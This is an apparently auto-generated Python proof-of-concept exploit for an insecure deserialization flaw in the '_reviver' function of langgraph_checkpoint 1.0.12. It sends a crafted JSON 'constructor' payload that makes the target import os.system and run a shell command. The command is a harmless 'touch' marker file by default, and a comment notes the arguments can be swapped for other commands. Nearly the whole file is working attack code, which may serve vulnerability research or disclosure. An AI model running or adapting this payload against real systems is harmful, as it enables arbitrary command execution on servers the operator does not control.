#!/usr/bin/env python3
# PoC for langgraph_checkpoint-1.0.12 (/tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12)
# Path: suspicious-002
# Sink: _reviver
# Auto-generated — run with: python3 rce_langgraph_checkpoint_system__reviver.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-1.0.12 RCE vulnerability.

Vulnerability: Insecure deserialization in _reviver function allows arbitrary
module import and method invocation via attacker-controlled JSON payload.

The _reviver function processes JSON objects with:
  - "lc": 2
  - "type": "constructor"
  - "id": ["module_name", "ClassName"]
  - "method": "method_name" (optional)
  - "args": [...] (optional)
  - "kwargs": {...} (optional)

This PoC demonstrates code execution by importing os.system and running a
benign command (creates a marker file in /tmp).
"""

import json
import sys
import urllib.request
import urllib.error
import socket

# ===== CONFIGURATION =====
TARGET_URL = "http://localhost:8080/api/v1/trigger"
TIMEOUT = 10  # seconds

# ===== PAYLOAD =====
# Benign payload: creates /tmp/poc_success.txt as proof of execution
# Change to "id": ["os", "system"] and "args": ["id > /tmp/poc_output.txt"]
# for a more visible test if needed.
PAYLOAD = {
    "lc": 2,
    "type": "constructor",
    "id": ["os", "system"],
    "method": None,  # Direct call to os.system
    "args": ["touch /tmp/poc_success.txt"],
    "kwargs": None
}


def send_payload(url: str, payload: dict) -> str:
    """
    Send the malicious JSON payload to the target endpoint.
    
    Args:
        url: Target URL
        payload: Dictionary to be JSON-serialized and sent
    
    Returns:
        Response text from server
    
    Raises:
        Various exceptions on connection/HTTP errors
    """
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as response:
            return response.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        # Even 500 errors are fine - the command may have executed before
        # the exception was caught in _reviver
        return f"HTTP {e.code}: {e.read().decode('utf-8', errors='replace')}"
    except urllib.error.URLError as e:
        raise ConnectionError(f"Failed to connect to {url}: {e.reason}")
    except socket.timeout:
        raise TimeoutError(f"Connection to {url} timed out after {TIMEOUT}s")


def verify_exploit() -> bool:
    """
    Check if the marker file was created on the target system.
    Note: This only works if we have local access to the target filesystem.
    For remote targets, you'd need another way to verify (e.g., out-of-band).
    
    Returns:
        True if marker file exists, False otherwise
    """
    import os
    return os.path.exists("/tmp/poc_success.txt")


def main():
    """Main exploit function."""
    print(f"[*] Targeting: {TARGET_URL}")
    print(f"[*] Payload: {json.dumps(PAYLOAD, indent=2)}")
    print()
    
    try:
        print("[*] Sending exploit payload...")
        response = send_payload(TARGET_URL, PAYLOAD)
        print(f"[*] Server response: {response[:200] if response else '(empty)'}")
        print()
        
        # Try to verify locally (works if script runs on same machine as target)
        if verify_exploit():
            print("[+] SUCCESS: Marker file /tmp/poc_success.txt was created!")
            print("[+] The target is vulnerable to RCE via _reviver deserialization.")
        else:
            print("[?] Cannot verify marker file locally.")
            print("[?] If the target is remote, check for out-of-band evidence.")
            print("[?] The exploit may still have succeeded - check /tmp on target.")
            
    except ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[-] Make sure the target server is running and reachable.")
        sys.exit(1)
    except TimeoutError as e:
        print(f"[-] Timeout: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
